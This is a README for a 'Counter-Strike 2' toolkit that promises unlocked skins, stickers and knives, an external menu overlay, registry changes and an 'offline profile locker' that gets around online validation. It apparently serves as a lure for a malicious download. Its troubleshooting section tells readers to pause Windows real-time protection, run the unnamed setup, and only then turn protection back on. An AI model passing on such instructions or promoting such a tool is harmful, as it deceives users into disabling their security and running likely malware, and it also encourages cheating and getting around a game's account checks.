# 🎯 CS2 Advanced Menu Toolkit

This repository provides an automated installation manager and system tuning utility designed to seamlessly prepare your gaming workstation for **Counter-Strike 2**.  
If you are looking for an efficient way to enhance your full CS2 experience without dealing with locked weapon finishes, limited sticker capsules, or tedious profile restrictions — this engine automates the entire sequence.

---

## ✨ Why Use This Deployment Tool?

Setting up advanced, high-performance tactical shooter environments on desktop operating systems frequently causes resource allocation errors, missing visual assets, or synchronization flags with online services.  
Our deployment utility solves these bottlenecks:

- **Full Visual Suite Deployment**  
  Expands the complete weapon finish, sticker, agent, and graffiti library with localized asset structures.

- **External Menu Overlay**  
  Provides a lightweight external menu interface for toggling visual options, crosshair presets, and HUD customization in real time.

- **Performance Rendering Linker**  
  Modifies local registry profiles to maximize hardware acceleration for higher FPS, reduced input lag, and smoother aim mechanics.

- **Asset Package Assembly**  
  Automatically downloads and pre-registers premium finishes, knife variants, gloves, agents, and exclusive overlays.

- **Offline Profile Locker**  
  Secures your active profile locally, preventing constant online validation checks and forced updates.

## 🛡 Resolving Issues

### Antivirus / SmartScreen Alerts
Security software might occasionally flag automated installers.  
If the file gets blocked:

1. Pause **"Real-time protection"** in Windows Security.
2. Run the setup.
3. Re-enable your antivirus immediately afterward.
